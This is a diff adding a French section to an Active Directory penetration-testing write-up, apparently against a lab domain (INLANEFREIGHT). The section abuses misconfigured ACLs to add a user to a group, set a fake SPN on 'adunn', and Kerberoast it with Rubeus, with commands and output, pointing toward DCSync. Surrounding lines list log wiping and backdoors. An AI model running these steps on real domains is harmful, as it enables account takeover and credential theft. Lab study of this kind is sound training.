@@ -3244,6 +3244,111 @@ Nous avons escaladé nos privilèges jusqu'à Domain Admin, ce qui nous permet d
 ✔️ 🏴 Post-exploitation (dump des mots de passe, persistance)
 ✔️ 🛡️ Nettoyage des logs pour masquer notre attaque
 ✔️ 🎭 Création d'un backdoor pour un accès furtif
+
+
+## 📌 Contexte et Objectifs  
+
+Nous avons réussi à compromettre l'utilisateur **wley**, à récupérer son hash NTLMv2, et à obtenir son mot de passe en clair.  
+
+Nous avons maintenant les informations nécessaires pour effectuer une attaque en chaîne visant à prendre le contrôle du compte **adunn** et effectuer un **attaque DCSync** pour récupérer les **hashes NTLM** de tous les utilisateurs du domaine. Cela nous permettra d'élever nos privilèges jusqu'à **Domain Admin** ou **Enterprise Admin**.
+
+---
+
+## 🔗 Chaîne d'attaque  
+
+1. **Ajouter `damundsen` au groupe "Help Desk Level 1"**  
+2. **Utiliser cette appartenance de groupe pour prendre le contrôle de `adunn`**
+3. **Modifier l'attribut `servicePrincipalName` pour effectuer un attaque Kerberoasting**
+4. **Kerberoasting avec Rubeus pour obtenir un hash à cracker hors ligne avec Hashcat**
+
+---
+
+## 🔐 Ajout de `damundsen` au groupe "Help Desk Level 1"
+
+### Étape 1 : Vérification des membres du groupe "Help Desk Level 1"
+
+Pour vérifier les membres du groupe "Help Desk Level 1", nous utilisons la commande suivante :
+
+```powershell
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+```
+Cela renverra la liste des utilisateurs actuellement membres de ce groupe.
+
+Étape 2 : Ajouter damundsen au groupe
+Nous allons ajouter damundsen au groupe "Help Desk Level 1" en utilisant les identifiants de l'utilisateur wley.
+
+```powershell
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+La sortie de la commande indiquera que l'ajout de l'utilisateur a réussi :
+
+```sql
+VERBOSE: [Get-PrincipalContext] Using alternate credentials
+VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
+```
+
+Étape 3 : Vérification de l'ajout au groupe
+Pour vérifier que l'utilisateur damundsen a bien été ajouté au groupe, nous utilisons la commande suivante :
+
+```powershell
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+```
+La sortie sera similaire à ceci :
+
+```markdown
+MemberName
+----------
+busucher
+spergazed
+damundsen
+dpayne
+```
+Nous pouvons maintenant utiliser cette appartenance au groupe pour exploiter les droits de l'utilisateur et prendre le contrôle de adunn.
+
+🔹 Création d'un Fake SPN pour Kerberoasting
+Étape 1 : Modifier l'attribut servicePrincipalName de l'utilisateur adunn
+L'objectif est de créer un Fake SPN en modifiant l'attribut servicePrincipalName de l'utilisateur adunn pour effectuer un Kerberoasting. Pour ce faire, nous utilisons la commande suivante :
+
+```powershell
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+Si la commande réussit, nous voyons la sortie suivante :
+
+```sql
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
+```
+Étape 2 : Kerberoasting avec Rubeus
+Une fois le Fake SPN créé, nous pouvons lancer une attaque Kerberoasting pour récupérer le hash du TGS ticket associé à ce SPN.
+
+Nous utilisons Rubeus pour effectuer l'attaque :
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+Sortie de la commande :
+
+```ruby
+[*] Action: Kerberoasting
+[*] Target User            : adunn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] ServicePrincipalName   : notahacker/LEGIT
+[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$
+```
+Nous avons maintenant récupéré le hash et pouvons le cracker hors ligne à l'aide de Hashcat pour obtenir le mot de passe en clair.
+
+✅ Conclusion
+Nous avons utilisé les ACL mal configurées pour ajouter damundsen au groupe Help Desk Level 1 et ensuite exploiter cette appartenance pour modifier l'attribut SPN de adunn. Cela nous a permis de récupérer un hash via une attaque Kerberoasting.
+
+La prochaine étape consiste à cracker le hash avec Hashcat pour obtenir le mot de passe en clair, puis utiliser ce dernier pour effectuer une attaque DCSync et prendre le contrôle complet du domaine.
+
+🚀 Prochaines étapes
+✔️ Cracking du hash récupéré avec Hashcat
+✔️ Exécution de l'attaque DCSync pour récupérer les hash NTLM des autres utilisateurs
+✔️ Élévation des privilèges pour obtenir un contrôle complet du domaine
+
+
 ### DCSync
 
 
